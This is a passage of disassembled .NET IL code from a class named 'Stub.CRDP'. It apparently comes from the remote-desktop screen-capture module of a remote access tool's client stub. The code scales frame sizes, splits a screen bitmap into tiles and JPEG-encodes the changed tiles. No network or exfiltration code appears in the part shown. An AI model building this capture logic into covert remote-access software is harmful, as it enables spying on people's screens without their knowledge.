    IL_033d:  br         IL_04ec

    IL_0342:  nop
    IL_0343:  ldloca.s   V_1
    IL_0345:  ldloca.s   V_1
    IL_0347:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_034c:  conv.r8
    IL_034d:  ldc.r8     3.
    IL_0356:  div
    IL_0357:  conv.r8
    IL_0358:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_035d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0362:  conv.ovf.i4
    IL_0363:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0368:  nop
    IL_0369:  ldloca.s   V_1
    IL_036b:  ldloca.s   V_1
    IL_036d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0372:  conv.r8
    IL_0373:  ldc.r8     3.
    IL_037c:  div
    IL_037d:  conv.r8
    IL_037e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0383:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0388:  conv.ovf.i4
    IL_0389:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_038e:  nop
    IL_038f:  nop
    IL_0390:  br         IL_04ec

    IL_0395:  br         IL_04ec

    IL_039a:  nop
    IL_039b:  ldloca.s   V_1
    IL_039d:  ldloca.s   V_1
    IL_039f:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_03a4:  conv.r8
    IL_03a5:  ldc.r8     3.5
    IL_03ae:  div
    IL_03af:  conv.r8
    IL_03b0:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03b5:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03ba:  conv.ovf.i4
    IL_03bb:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_03c0:  nop
    IL_03c1:  ldloca.s   V_1
    IL_03c3:  ldloca.s   V_1
    IL_03c5:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_03ca:  conv.r8
    IL_03cb:  ldc.r8     3.5
    IL_03d4:  div
    IL_03d5:  conv.r8
    IL_03d6:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03db:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03e0:  conv.ovf.i4
    IL_03e1:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_03e6:  nop
    IL_03e7:  nop
    IL_03e8:  br         IL_04ec

    IL_03ed:  br         IL_04ec

    IL_03f2:  nop
    IL_03f3:  ldloca.s   V_1
    IL_03f5:  ldloca.s   V_1
    IL_03f7:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_03fc:  conv.r8
    IL_03fd:  ldc.r8     4.
    IL_0406:  div
    IL_0407:  conv.r8
    IL_0408:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_040d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0412:  conv.ovf.i4
    IL_0413:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0418:  nop
    IL_0419:  ldloca.s   V_1
    IL_041b:  ldloca.s   V_1
    IL_041d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0422:  conv.r8
    IL_0423:  ldc.r8     4.
    IL_042c:  div
    IL_042d:  conv.r8
    IL_042e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0433:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0438:  conv.ovf.i4
    IL_0439:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_043e:  nop
    IL_043f:  nop
    IL_0440:  br         IL_04ec

    IL_0445:  br         IL_04ec

    IL_044a:  nop
    IL_044b:  ldloca.s   V_1
    IL_044d:  ldloca.s   V_1
    IL_044f:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_0454:  conv.r8
    IL_0455:  ldc.r8     5.
    IL_045e:  div
    IL_045f:  conv.r8
    IL_0460:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0465:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_046a:  conv.ovf.i4
    IL_046b:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0470:  nop
    IL_0471:  ldloca.s   V_1
    IL_0473:  ldloca.s   V_1
    IL_0475:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_047a:  conv.r8
    IL_047b:  ldc.r8     5.
    IL_0484:  div
    IL_0485:  conv.r8
    IL_0486:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_048b:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0490:  conv.ovf.i4
    IL_0491:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0496:  nop
    IL_0497:  nop
    IL_0498:  br.s       IL_04ec

    IL_049a:  br.s       IL_04ec

    IL_049c:  nop
    IL_049d:  ldloca.s   V_1
    IL_049f:  ldloca.s   V_1
    IL_04a1:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_04a6:  conv.r8
    IL_04a7:  ldc.r8     6.
    IL_04b0:  div
    IL_04b1:  conv.r8
    IL_04b2:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_04b7:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_04bc:  conv.ovf.i4
    IL_04bd:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_04c2:  nop
    IL_04c3:  ldloca.s   V_1
    IL_04c5:  ldloca.s   V_1
    IL_04c7:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_04cc:  conv.r8
    IL_04cd:  ldc.r8     6.
    IL_04d6:  div
    IL_04d7:  conv.r8
    IL_04d8:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_04dd:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_04e2:  conv.ovf.i4
    IL_04e3:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_04e8:  nop
    IL_04e9:  nop
    IL_04ea:  br.s       IL_04ec

    IL_04ec:  nop
    IL_04ed:  ldloca.s   V_1
    IL_04ef:  ldloca.s   V_1
    IL_04f1:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_04f6:  stloc.s    V_5
    IL_04f8:  ldloca.s   V_5
    IL_04fa:  call       instance string [mscorlib]System.Int32::ToString()
    IL_04ff:  ldc.i4.1
    IL_0500:  ldloca.s   V_1
    IL_0502:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_0507:  stloc.s    V_6
    IL_0509:  ldloca.s   V_6
    IL_050b:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0510:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0515:  ldc.i4.1
    IL_0516:  sub.ovf
    IL_0517:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Mid(string,
                                                                                          int32,
                                                                                          int32)
    IL_051c:  ldc.i4.0
    IL_051d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0522:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0527:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_052c:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0531:  nop
    IL_0532:  ldloca.s   V_1
    IL_0534:  ldloca.s   V_1
    IL_0536:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_053b:  stloc.s    V_6
    IL_053d:  ldloca.s   V_6
    IL_053f:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0544:  ldc.i4.1
    IL_0545:  ldloca.s   V_1
    IL_0547:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_054c:  stloc.s    V_5
    IL_054e:  ldloca.s   V_5
    IL_0550:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0555:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_055a:  ldc.i4.1
    IL_055b:  sub.ovf
    IL_055c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Mid(string,
                                                                                          int32,
                                                                                          int32)
    IL_0561:  ldc.i4.0
    IL_0562:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0567:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_056c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_0571:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0576:  nop
    IL_0577:  ldloc.1
    IL_0578:  stloc.0
    IL_0579:  br.s       IL_057b

    IL_057b:  ldloc.0
    IL_057c:  ret
  } // end of method CRDP::QZ

} // end of class Stub.CRDP

.class public auto ansi beforefieldinit Stub.CRDP1
       extends [mscorlib]System.Object
{
  .field private static class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> OA
  .field private static class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> OAA
  .field private static int32 oCo
  .field private static class [System.Drawing]System.Drawing.Bitmap OM
  .field private static int32 oQ
  .field private static int32 oQu
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       52 (0x34)
    .maxstack  8
    IL_0000:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::.ctor()
    IL_0005:  stsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP1::OA
    IL_000a:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::.ctor()
    IL_000f:  stsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP1::OAA
    IL_0014:  ldc.i4.0
    IL_0015:  stsfld     int32 Stub.CRDP1::oCo
    IL_001a:  ldc.i4.1
    IL_001b:  ldc.i4.1
    IL_001c:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_0021:  stsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP1::OM
    IL_0026:  ldc.i4.0
    IL_0027:  stsfld     int32 Stub.CRDP1::oQ
    IL_002c:  ldc.i4.0
    IL_002d:  stsfld     int32 Stub.CRDP1::oQu
    IL_0032:  nop
    IL_0033:  ret
  } // end of method CRDP1::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method CRDP1::.ctor

  .method public static uint8[]  Cap(int32 q,
                                     int32 co,
                                     int32 Qu) cil managed
  {
    // Code size       1675 (0x68b)
    .maxstack  5
    .locals init (uint8[] V_0,
             class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo V_1,
             class [System.Drawing]System.Drawing.Imaging.EncoderParameters V_2,
             class [System.Drawing]System.Drawing.Graphics V_3,
             int32 V_4,
             int32 V_5,
             class [System.Drawing]System.Drawing.Bitmap V_6,
             int32 V_7,
             class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> V_8,
             class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> V_9,
             class [mscorlib]System.Collections.Generic.List`1<int32> V_10,
             int32 V_11,
             int32 V_12,
             int32 V_13,
             class [System.Drawing]System.Drawing.Bitmap V_14,
             valuetype [System.Drawing]System.Drawing.Point V_15,
             string V_16,
             valuetype [System.Drawing]System.Drawing.Size V_17,
             class [mscorlib]System.IO.MemoryStream V_18,
             class [mscorlib]System.IO.MemoryStream V_19,
             int32 V_20,
             int32 V_21,
             int32 V_22,
             int32 V_23,
             int32 V_24,
             int32 V_25,
             int32 V_26,
             uint8[] V_27,
             class [System.Drawing]System.Drawing.Bitmap V_28,
             uint8[] V_29,
             class [System.Drawing]System.Drawing.Bitmap V_30,
             int32 V_31,
             int32 V_32,
             int32 V_33,
             valuetype [System.Drawing]System.Drawing.Rectangle V_34,
             class [mscorlib]System.IO.MemoryStream V_35,
             int32 V_36,
             valuetype [System.Drawing]System.Drawing.Point V_37,
             string[] V_38,
             int32 V_39,
             int32 V_40,
             valuetype [System.Drawing]System.Drawing.Size V_41,
             uint8[] V_42,
             valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<int32> V_43,
             bool V_44)
    IL_0000:  nop
    IL_0001:  ldloca.s   V_17
    IL_0003:  ldarg.0
    IL_0004:  call       valuetype [System.Drawing]System.Drawing.Size Stub.CRDP1::QZ(int32)
    IL_0009:  call       valuetype [System.Drawing]System.Drawing.Point [System.Drawing]System.Drawing.Size::op_Explicit(valuetype [System.Drawing]System.Drawing.Size)
    IL_000e:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(valuetype [System.Drawing]System.Drawing.Point)
    IL_0013:  nop
    IL_0014:  ldloca.s   V_17
    IL_0016:  ldloca.s   V_17
    IL_0018:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_001d:  stloc.s    V_39
    IL_001f:  ldloca.s   V_39
    IL_0021:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0026:  ldc.i4.1
    IL_0027:  ldloca.s   V_17
    IL_0029:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_002e:  stloc.s    V_40
    IL_0030:  ldloca.s   V_40
    IL_0032:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0037:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_003c:  ldc.i4.1
    IL_003d:  sub.ovf
    IL_003e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Mid(string,
                                                                                          int32,
                                                                                          int32)
    IL_0043:  ldc.i4.0
    IL_0044:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0049:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_004e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_0053:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0058:  nop
    IL_0059:  ldloca.s   V_17
    IL_005b:  ldloca.s   V_17
    IL_005d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0062:  stloc.s    V_40
    IL_0064:  ldloca.s   V_40
    IL_0066:  call       instance string [mscorlib]System.Int32::ToString()
    IL_006b:  ldc.i4.1
    IL_006c:  ldloca.s   V_17
    IL_006e:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0073:  stloc.s    V_39
    IL_0075:  ldloca.s   V_39
    IL_0077:  call       instance string [mscorlib]System.Int32::ToString()
    IL_007c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0081:  ldc.i4.1
    IL_0082:  sub.ovf
    IL_0083:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Mid(string,
                                                                                          int32,
                                                                                          int32)
    IL_0088:  ldc.i4.0
    IL_0089:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_008e:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0093:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_0098:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_009d:  nop
    IL_009e:  ldsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP1::OM
    IL_00a3:  callvirt   instance valuetype [System.Drawing]System.Drawing.Size [System.Drawing]System.Drawing.Image::get_Size()
    IL_00a8:  stloc.s    V_41
    IL_00aa:  ldloca.s   V_41
    IL_00ac:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_00b1:  ldloca.s   V_17
    IL_00b3:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_00b8:  ceq
    IL_00ba:  ldc.i4.0
    IL_00bb:  ceq
    IL_00bd:  ldsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP1::OM
    IL_00c2:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
    IL_00c7:  ldloca.s   V_17
    IL_00c9:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_00ce:  ceq
    IL_00d0:  ldc.i4.0
    IL_00d1:  ceq
    IL_00d3:  or
    IL_00d4:  ldsfld     int32 Stub.CRDP1::oCo
    IL_00d9:  ldarg.1
    IL_00da:  ceq
    IL_00dc:  ldc.i4.0
    IL_00dd:  ceq
    IL_00df:  or
    IL_00e0:  ldsfld     int32 Stub.CRDP1::oQu
    IL_00e5:  ldarg.2
    IL_00e6:  ceq
    IL_00e8:  ldc.i4.0
    IL_00e9:  ceq
    IL_00eb:  or
    IL_00ec:  stloc.s    V_44
    IL_00ee:  ldloc.s    V_44
    IL_00f0:  brfalse.s  IL_0120

    IL_00f2:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP1::OA
    IL_00f7:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::Clear()
    IL_00fc:  nop
    IL_00fd:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP1::OAA
    IL_0102:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Clear()
    IL_0107:  nop
    IL_0108:  ldloca.s   V_17
    IL_010a:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_010f:  ldloca.s   V_17
    IL_0111:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0116:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_011b:  stsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP1::OM
    IL_0120:  nop
    IL_0121:  ldarg.0
    IL_0122:  stsfld     int32 Stub.CRDP1::oQ
    IL_0127:  ldarg.1
    IL_0128:  stsfld     int32 Stub.CRDP1::oCo
    IL_012d:  ldarg.2
    IL_012e:  stsfld     int32 Stub.CRDP1::oQu
    IL_0133:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::.ctor()
    IL_0138:  stloc.s    V_8
    IL_013a:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::.ctor()
    IL_013f:  stloc.s    V_9
    IL_0141:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP1::OA
    IL_0146:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Count()
    IL_014b:  ldc.i4.0
    IL_014c:  cgt
    IL_014e:  stloc.s    V_44
    IL_0150:  ldloc.s    V_44
    IL_0152:  brfalse.s  IL_019a

    IL_0154:  ldloc.s    V_8
    IL_0156:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP1::OA
    IL_015b:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::ToArray()
    IL_0160:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::AddRange(class [mscorlib]System.Collections.Generic.IEnumerable`1<!0>)
    IL_0165:  nop
    IL_0166:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP1::OA
    IL_016b:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::Clear()
    IL_0170:  nop
    IL_0171:  ldloc.s    V_9
    IL_0173:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP1::OAA
    IL_0178:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::ToArray()
    IL_017d:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::AddRange(class [mscorlib]System.Collections.Generic.IEnumerable`1<!0>)
    IL_0182:  nop
    IL_0183:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP1::OAA
    IL_0188:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Clear()
    IL_018d:  nop
    IL_018e:  ldsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP1::OM
    IL_0193:  stloc.s    V_14
    IL_0195:  br         IL_03ba

    IL_019a:  nop
    IL_019b:  ldloca.s   V_17
    IL_019d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_01a2:  ldloca.s   V_17
    IL_01a4:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_01a9:  ldc.i4.1
    IL_01aa:  call       class [System.Drawing]System.Drawing.Image Stub.CRDP1::Gd(int32,
                                                                                   int32,
                                                                                   bool)
    IL_01af:  castclass  [System.Drawing]System.Drawing.Bitmap
    IL_01b4:  stloc.s    V_14
    IL_01b6:  ldloca.s   V_17
    IL_01b8:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_01bd:  stloc.s    V_24
    IL_01bf:  ldloca.s   V_17
    IL_01c1:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_01c6:  stloc.s    V_22
    IL_01c8:  ldarg.1
    IL_01c9:  ldc.i4.1
    IL_01ca:  sub.ovf
    IL_01cb:  stloc.s    V_23
    IL_01cd:  ldc.i4.0
    IL_01ce:  stloc.s    V_21
    IL_01d0:  br         IL_03a8

    IL_01d5:  ldarg.1
    IL_01d6:  ldc.i4.1
    IL_01d7:  sub.ovf
    IL_01d8:  stloc.s    V_26
    IL_01da:  ldc.i4.0
    IL_01db:  stloc.s    V_25
    IL_01dd:  br         IL_038f

    IL_01e2:  ldloc.s    V_22
    IL_01e4:  conv.r8
    IL_01e5:  ldarg.1
    IL_01e6:  conv.r8
    IL_01e7:  div
    IL_01e8:  ldloc.s    V_21
    IL_01ea:  conv.r8
    IL_01eb:  mul
    IL_01ec:  conv.r8
    IL_01ed:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01f2:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01f7:  conv.ovf.i4
    IL_01f8:  stloc.s    V_31
    IL_01fa:  ldloc.s    V_24
    IL_01fc:  conv.r8
    IL_01fd:  ldarg.1
    IL_01fe:  conv.r8
    IL_01ff:  div
    IL_0200:  ldloc.s    V_25
    IL_0202:  conv.r8
    IL_0203:  mul
    IL_0204:  conv.r8
    IL_0205:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_020a:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_020f:  conv.ovf.i4
    IL_0210:  stloc.s    V_36
    IL_0212:  ldloc.s    V_24
    IL_0214:  conv.r8
    IL_0215:  ldarg.1
    IL_0216:  conv.r8
    IL_0217:  div
    IL_0218:  conv.r8
    IL_0219:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_021e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0223:  conv.ovf.i4
    IL_0224:  stloc.s    V_33
    IL_0226:  ldloc.s    V_22
    IL_0228:  conv.r8
    IL_0229:  ldarg.1
    IL_022a:  conv.r8
    IL_022b:  div
    IL_022c:  conv.r8
    IL_022d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0232:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0237:  conv.ovf.i4
    IL_0238:  stloc.s    V_32
    IL_023a:  ldloca.s   V_33
    IL_023c:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0241:  ldstr      "."
    IL_0246:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_024b:  stloc.s    V_44
    IL_024d:  ldloc.s    V_44
    IL_024f:  brfalse.s  IL_026d

    IL_0251:  ldloc.s    V_33
    IL_0253:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0258:  ldstr      "."
    IL_025d:  ldc.i4.m1
    IL_025e:  ldc.i4.0
    IL_025f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0264:  ldc.i4.0
    IL_0265:  ldelem.ref
    IL_0266:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_026b:  stloc.s    V_33
    IL_026d:  nop
    IL_026e:  ldloca.s   V_32
    IL_0270:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0275:  ldstr      "."
    IL_027a:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_027f:  stloc.s    V_44
    IL_0281:  ldloc.s    V_44
    IL_0283:  brfalse.s  IL_02a1

    IL_0285:  ldloc.s    V_32
    IL_0287:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_028c:  ldstr      "."
    IL_0291:  ldc.i4.m1
    IL_0292:  ldc.i4.0
    IL_0293:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0298:  ldc.i4.0
    IL_0299:  ldelem.ref
    IL_029a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_029f:  stloc.s    V_32
    IL_02a1:  nop
    IL_02a2:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_02a7:  stloc.s    V_35
    IL_02a9:  ldloca.s   V_34
    IL_02ab:  ldloc.s    V_36
    IL_02ad:  ldloc.s    V_31
    IL_02af:  ldloc.s    V_33
    IL_02b1:  ldloc.s    V_32
    IL_02b3:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                       int32,
                                                                                       int32,
                                                                                       int32)
    IL_02b8:  nop
    IL_02b9:  ldloc.s    V_14
    IL_02bb:  ldloc.s    V_34
    IL_02bd:  ldloc.s    V_14
    IL_02bf:  callvirt   instance valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat [System.Drawing]System.Drawing.Image::get_PixelFormat()
    IL_02c4:  callvirt   instance class [System.Drawing]System.Drawing.Bitmap [System.Drawing]System.Drawing.Bitmap::Clone(valuetype [System.Drawing]System.Drawing.Rectangle,
                                                                                                                           valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
    IL_02c9:  stloc.s    V_30
    IL_02cb:  ldloca.s   V_34
    IL_02cd:  ldloc.s    V_36
    IL_02cf:  ldloc.s    V_31
    IL_02d1:  ldloc.s    V_33
    IL_02d3:  ldloc.s    V_32
    IL_02d5:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                       int32,
                                                                                       int32,
                                                                                       int32)
    IL_02da:  nop
    IL_02db:  ldsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP1::OM
    IL_02e0:  ldloc.s    V_34
    IL_02e2:  ldloc.s    V_14
    IL_02e4:  callvirt   instance valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat [System.Drawing]System.Drawing.Image::get_PixelFormat()
    IL_02e9:  callvirt   instance class [System.Drawing]System.Drawing.Bitmap [System.Drawing]System.Drawing.Bitmap::Clone(valuetype [System.Drawing]System.Drawing.Rectangle,
                                                                                                                           valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
    IL_02ee:  stloc.s    V_28
    IL_02f0:  ldloc.s    V_30
    IL_02f2:  ldloc.s    V_35
    IL_02f4:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
    IL_02f9:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                  class [System.Drawing]System.Drawing.Imaging.ImageFormat)
    IL_02fe:  nop
    IL_02ff:  ldloc.s    V_35
    IL_0301:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0306:  stloc.s    V_27
    IL_0308:  ldloc.s    V_35
    IL_030a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_030f:  nop
    IL_0310:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0315:  stloc.s    V_35
    IL_0317:  ldloc.s    V_28
    IL_0319:  ldloc.s    V_35
    IL_031b:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
    IL_0320:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                  class [System.Drawing]System.Drawing.Imaging.ImageFormat)
    IL_0325:  nop
    IL_0326:  ldloc.s    V_35
    IL_0328:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_032d:  stloc.s    V_29
    IL_032f:  ldloc.s    V_35
